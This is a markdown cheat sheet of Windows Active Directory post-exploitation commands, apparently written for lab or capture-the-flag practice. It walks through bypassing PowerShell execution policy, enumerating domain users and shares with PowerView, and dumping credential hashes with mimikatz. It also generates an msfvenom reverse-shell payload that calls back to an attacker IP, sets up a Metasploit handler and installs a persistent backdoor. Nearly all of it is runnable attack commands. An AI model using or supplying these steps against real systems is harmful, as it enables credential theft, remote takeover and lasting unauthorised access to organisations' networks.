# Post exploitation
Following examples have been tested on Windows targets with a SSH connections

Any question ? 
**Here is the answer :** https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/

## Enumeration w/ PowerView
***CheatSheet*** : 
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Starts powershell
```cmd
powershell -ep bypass
```

We can now load PowerView module
```ps
.\Downloads\PowerView.ps1
```

- Enumerate domain users `Get-NetUser | select cn`
- Enumerate domain groups `Get-NetGroup`
- Enumerate selected domain groups `Get-NetGroup -GroupName *admin*`
- Enumerate shares `Invoke-ShareFinder`
- Gather system informations `Get-NetComputer -fulldata`


## Dumping hashes w/ mimikatz
Start mimikatz and verify that you have admin perms (OK 20)
```cmd
.\mimikatz.exe
privilege::debug
```
Dump those hashes!
```mimikatz
lsadump::lsa /patch 
```
Time to crack !  

## Enumeration w/ Server Manager
(This requires a RDP connection)
```
Start Windows Server Manager
```

```
Navigate to the tools tab and select the tool you want 
```

## Maintaining access w/ Metasploit
### Upgrade to meterpreter
1. We want to upgrade our shell to a meterpreter. to do so, we need to use msfvenom to generate a payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCALIPADDR LPORT=4444 -f exe -o shell.exe
```
Example :
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.14.34 LPORT=4444 -f exe -o shell.exe
```
2. Transfer the payload to the target
```bash
scp shell.exe Administrator@CONTROLLER:shell.exe
```
3. Start and set up a multi/handler listener (ips, ports and payload need to match with the msfvenom payload)
```bash
msfconsole
use multi/handler
set LHOST 10.8.14.34
set LPORT 4444
set payload windows/meterpreter/reverse_tcp
run
```
4. Execute the payload on the target machine
5. Verify that you received a meterpreter shell

## Run persitence module
Now, we can background the session to run the persitence module
```msfconsole
CTRL+Z
use exploit/windows/local/persistence
sessions
set session RIGHT_SESSION_NUMBER
run
```

If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.